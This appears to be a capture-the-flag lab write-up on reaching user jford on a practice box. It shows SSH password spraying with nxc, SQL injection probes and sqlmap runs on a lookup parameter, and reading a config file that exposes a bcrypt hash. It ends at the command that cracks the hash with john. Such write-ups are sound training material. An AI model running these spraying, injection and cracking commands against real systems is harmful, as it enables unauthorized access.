Misstep 1 — Credential reuse against SSH (dead end)

My first assumption was password reuse: one of these passwords might be jford’s system password. 
I sprayed all nine against SSH:

bash
nxc ssh 10.129.147.83 -u jford -p creds.txt

All nine failed. I confirmed SSH allowed password auth (PasswordAuthentication yes), 
so the failures were real — these passwords simply aren’t jford’s. 
I also tried su jford locally with the same list 
(fighting a bash: !7: event not found history-expansion error on the admin password along the way); it also failed.
Conclusion: the users-table passwords were a distraction.

Misstep 2 — Chasing SQLi on the lookup parameter (dead end)

A room hint suggested the id lookup parameter was SQL-injectable. I tested it manually first:

?id=1 AND 1=1-- -   → returns the record
?id=1 AND 1=2-- -   → returns the SAME record (should be empty if injectable)

Identical output meant the injected logic was ignored — a sign id is cast to an integer. 
I confirmed with sqlmap at maximum depth:

bash
sqlmap -u "http://<target>/admin/users/lookup.php?id=1" \
  --cookie="PHPSESSID=..." --dbms=sqlite --level=5 --risk=3 --batch --dbs

sqlmap explicitly reported possible integer casting detected (intval()) and found no injectable parameter. 
The lookup was a dead end — the hint’s real value was its second half (“use discovered account information”),
not a literal injection.

The actual path — the config file

Stepping back from the DB passwords, I enumerated directories I hadn’t yet read from inside the box 
In particular /var/www/html/config/, which had returned 403 Forbidden over HTTP during initial recon (gobuster flagged /config as 403). 
From the shell it was readable:

bash
cat /var/www/html/config/db.conf
# RecruitCorp application database config
# Pulled out of source control - DO NOT COMMIT.
db_host=localhost
db_name=recruitcorp
db_user=jford
db_pass_hash=$2b$10$QzkXmGndA2cQLozO3xAN6eWKrl6ZXyzhYTJNF67exOmTmN5oVSEfq
db_engine=sqlite3

This was the real credential: a bcrypt hash ($2b$) explicitly tied to db_user=jford the system user I was targeting. 
The comment (“DO NOT COMMIT”) confirms it’s a leaked secret.

Cracking the hash 
bash
echo '$2b$10$QzkXmGndA2cQLozO3xAN6eWKrl6ZXyzhYTJNF67exOmTmN5oVSEfq' > jford.hash
john jford.hash --wordlist=/usr/share/wordlists/rockyou.txt

